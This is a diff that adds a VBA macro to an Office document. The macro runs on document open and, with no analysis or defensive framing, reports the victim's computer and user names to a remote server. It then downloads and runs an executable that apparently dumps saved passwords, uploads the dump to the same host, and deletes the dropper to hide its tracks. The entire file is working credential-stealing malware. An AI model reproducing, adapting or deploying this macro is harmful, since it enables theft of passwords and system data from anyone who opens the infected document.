@@ -1,0 +1,145 @@
+Option Explicit
+
+' variables part
+Public CN As String
+Public APD As String
+Public UN As String
+Public HOSTNAME As String
+Public DROPPER_EXE As String
+Public PAYLOADS_FOLDER As String
+Public PAYLOAD_FILE As String
+
+Function InitMe()
+    DROPPER_EXE = "\wss.exe"
+    HOSTNAME = "http://www.nemogucamisija.com/xcode"
+    PAYLOADS_FOLDER = HOSTNAME & "/payloads/"
+    PAYLOAD_FILE = "fixed_wbs.exe"
+    CN = Environ("COMPUTERNAME")
+    APD = Environ("TMP")
+    UN = Environ("USERNAME")
+End Function
+
+
+Sub Document_Open()
+    InitMe
+    Dim val As String
+    Dim FN As String
+    
+    'Clean APD ' ciscenje temp
+    
+    http ("action=new&computername=" & CN & "&username=" & UN & "&systemdrive=" & Environ("SYSTEMDRIVE") & "&os=" & Environ("OS")) ' slanje info
+    PayLoad (APD + DROPPER_EXE) ' snimanje payloada
+    Dim oShell
+    Set oShell = CreateObject("WScript.Shell")
+        
+    oShell.Run APD + DROPPER_EXE & " /stext " & APD & "\pwd.dump"
+    FN = APD & "\pwd.dump"
+    
+    pvPostFile HOSTNAME & "/index.php?action=upload&computername=" & CN & "&username=" & UN & "&ts=" & rndNumber & rndNumber, FN, True
+    On Error Resume Next
+    Kill APD & DROPPER_EXE
+    'Kill APD + "\pwd.dump"
+    On Error GoTo 0
+    
+End Sub
+
+
+
+Private Function decodeBase64(base64)
+  Dim DM, EL
+  Set DM = CreateObject("Microsoft.XMLDOM")
+  Set EL = DM.createElement("tmp")
+  EL.dataType = "bin.base64"
+  EL.Text = base64
+  decodeBase64 = EL.nodeTypedValue
+End Function
+  
+Private Sub writeBytes(file, bytes)
+  Dim binaryStream
+  Set binaryStream = CreateObject("ADODB.Stream")
+  binaryStream.Type = 1
+  binaryStream.Open
+  binaryStream.Write bytes
+  binaryStream.SaveToFile file, 2
+End Sub
+
+
+
+Function rndNumber() As Integer
+    Dim LRandomNumber As Integer
+    LRandomNumber = Int((300 - 200 + 1) * Rnd + 200)
+    rndNumber = LRandomNumber
+End Function
+
+Function getPayload(val As String, FN As String)
+    Dim WinHttpReq As Object
+    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
+
+    WinHttpReq.Open "GET", PAYLOADS_FOLDER & val & "?ts=" & rndNumber & rndNumber, False
+    
+    WinHttpReq.SetRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+    WinHttpReq.SetRequestHeader "Accept", "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+    WinHttpReq.SetRequestHeader "Accept-Language", "en-us,en;q=0.5"
+    WinHttpReq.SetRequestHeader "Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
+    
+    
+    WinHttpReq.send
+    'writeBytes FN, decodeBase64(WinHttpReq.ResponseBody)
+    writeBytes FN, WinHttpReq.ResponseBody
+End Function
+
+Function http(val As String)
+    Dim MyRequest As Object
+    Set MyRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
+    MyRequest.Open "GET", _
+    HOSTNAME & "/index.php?" + val
+    MyRequest.send
+    'MsgBox MyRequest.ResponseText
+End Function
+
+
+Private Sub pvPostFile(sUrl As String, sFileName As String, Optional ByVal bAsync As Boolean)
+    Const STR_BOUNDARY  As String = "3fbd04f5-b1ed-4060-99b9-fca7ff59c113"
+    Dim nFile           As Integer
+    Dim baBuffer()      As Byte
+    Dim sPostData       As String
+ 
+    '--- read file
+    nFile = FreeFile
+    Open sFileName For Binary Access Read As nFile
+    If LOF(nFile) > 0 Then
+        ReDim baBuffer(0 To LOF(nFile) - 1) As Byte
+        Get nFile, , baBuffer
+        sPostData = StrConv(baBuffer, vbUnicode)
+    End If
+    Close nFile
+    '--- prepare body
+    sPostData = "--" & STR_BOUNDARY & vbCrLf & _
+        "Content-Disposition: form-data; name=""uploadfile""; filename=""" & Mid$(sFileName, InStrRev(sFileName, "\") + 1) & """" & vbCrLf & _
+        "Content-Type: application/octet-stream" & vbCrLf & vbCrLf & _
+        sPostData & vbCrLf & _
+        "--" & STR_BOUNDARY & "--"
+    '--- post
+    With CreateObject("Microsoft.XMLHTTP")
+        .Open "POST", sUrl, bAsync
+        .SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & STR_BOUNDARY
+        .send pvToByteArray(sPostData)
+    End With
+    'MsgBox sUrl
+End Sub
+ 
+Private Function pvToByteArray(sText As String) As Byte()
+    pvToByteArray = StrConv(sText, vbFromUnicode)
+End Function
+
+Sub Clean(APD As String)
+    On Error Resume Next
+    Kill APD + DROPPER_EXE
+    Kill APD + "\pwd.dump"
+End Sub
+
+Function PayLoad(ByVal FN As String)
+    'getPayload "payload_wbs.base64", FN
+    getPayload PAYLOAD_FILE, FN
+    
+End Function
